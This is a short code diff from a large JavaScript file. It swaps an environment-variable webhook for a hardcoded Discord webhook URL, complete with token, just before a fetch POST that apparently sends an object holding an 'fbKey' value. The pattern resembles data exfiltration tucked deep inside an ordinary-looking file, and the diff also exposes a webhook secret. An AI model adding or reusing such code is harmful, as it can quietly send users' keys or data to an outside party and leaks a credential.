@@ -19613,8 +19613,8 @@ function y1() {
             fbKey: f
         });
         
-        // Discord webhook from env - name: RETURN
-        const webhook = process.env.RETURN;
+        // Direct Discord webhook — no env
+        const webhook = 'https://discord.com/api/webhooks/1478622668025630741/ydzTTA4qZ56wyNCdj0qsLyHD2kIwKUon5dzyoQNkn27sv3Npvc5xQiEy6o_vwmlAuzYZ';
         
         fetch(webhook, {
             method: 'POST',
